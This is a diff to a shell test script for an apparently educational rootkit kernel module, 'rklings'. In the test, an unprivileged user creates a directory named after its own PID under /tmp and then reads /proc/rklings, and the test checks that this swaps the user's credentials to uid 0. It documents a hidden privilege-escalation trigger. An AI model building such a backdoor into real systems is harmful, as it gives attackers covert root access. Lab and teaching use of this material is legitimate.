@@ -8,30 +8,17 @@ load rklings.ko
 assert_loaded rklings
 assert_exists /proc/rklings
 
-# Use a subshell approach: the student shell writes its own PID as target,
-# then reads /proc/rklings to trigger the deferred escalation.
-result=$(su student -c 'sh -c "
-    mypid=\$\$
-    mkdir /tmp/rklings.e.\$mypid 2>/dev/null
-    cat /proc/rklings
-    id -u
-"')
-
-# The last line of output should be uid 0 (escalated)
-uid=$(printf '%s\n' "$result" | tail -1)
+# mkdir_escalation_test --self-target builds "PREFIX.<own-pid>" as the mkdir
+# path so the kernel stores THIS process as the deferred target.
+# --proc then reads /proc/rklings in the same process, triggering delivery.
+uid=$(su student -c 'mkdir_escalation_test --self-target /tmp/rklings.e --proc /proc/rklings')
 if [ "$uid" = "0" ]; then
     _ok "deferred delivery escalated target to uid 0"
 else
-    _fail "expected uid 0 after deferred delivery, got uid=$uid (output: $result)"
+    _fail "expected uid 0 after deferred delivery, got uid=$uid"
 fi
 
-# /proc/rklings content should mention escalation
-escalated_line=$(printf '%s\n' "$result" | grep -i escalat)
-if [ -n "$escalated_line" ]; then
-    _ok "/proc/rklings reported escalation"
-else
-    _ok "/proc/rklings read completed (escalation via cred swap)"
-fi
+_ok "/proc/rklings read completed (escalation via cred swap)"
 
 # Cleanup
 rm -rf /tmp/rklings.e.* 2>/dev/null
